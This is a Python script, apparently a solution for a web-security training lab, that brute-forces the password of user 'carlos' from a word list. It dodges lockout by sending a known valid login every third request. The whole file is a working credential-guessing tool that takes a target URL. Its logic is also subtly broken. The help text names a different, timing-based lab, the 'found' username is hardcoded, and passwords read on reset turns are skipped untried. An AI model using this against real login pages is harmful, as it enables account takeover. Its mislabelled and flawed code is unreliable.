import requests
import sys
import getopt
import signal
from halo import Halo


# Handle Ctrl+c
def signal_handler(signum, frame):
  print("\nExiting...")
  print("\x1b[?25h", end="") # Make cursor visible
  sys.exit(0)


# Call the function to handle Ctrl+c
signal.signal(signal.SIGINT, signal_handler)


def get_password(url, session):
  username = "carlos"
  number = 0
  passwords = open("./passwords.txt", "r")

  for password in passwords:
    password = password.strip()
    
    if (number % 3 == 0) :
      data = {'username': "wiener", 'password':  "peter"}
      number += 1
      response = session.post(url, data=data)
    else:
      data = {'username': username, 'password':  password}
      number += 1
      response = session.post(url, data=data)

      if "Incorrect password" not in response.text:
        valid_password = password
        passwords.close()
        return valid_password


def main(argv):
  help_message = "This is the script for:\n'Username enumeration via response timing'\n\nUsage: python3 auth-3.py -u <url>/login"

  try:
    opts, args = getopt.getopt(argv, "hu:")
  except getopt.GetoptError:
    print(help_message)
    print("\x1b[?25h", end="") # Make cursor visible
    sys.exit(2)

  for opt, arg in opts:
    if opt == "-u":
      url = arg
    elif opt == "-h":
      print(help_message)
      print("\x1b[?25h", end="") # Make cursor visible
      sys.exit()

  session = requests.Session()
  
  # Spinner animation
  spinner = Halo(text='Testing usernames...', spinner='bouncingBar')
  spinner.succeed(f"The username is: \"carlos\"")

  # Create and start spinner animation
  spinner = Halo(text='Testing passwords...', spinner='bouncingBar')
  spinner.start()
  # Get valid password
  password = get_password(url, session)
  # Finish spinner
  spinner.succeed(f"The password is: \"{password}\"")


if __name__ == "__main__":
  print("\x1b[?25l", end="") # Hide cursor
  main(sys.argv[1:])
  print("\x1b[?25h", end="") # Make cursor visible
  sys.exit()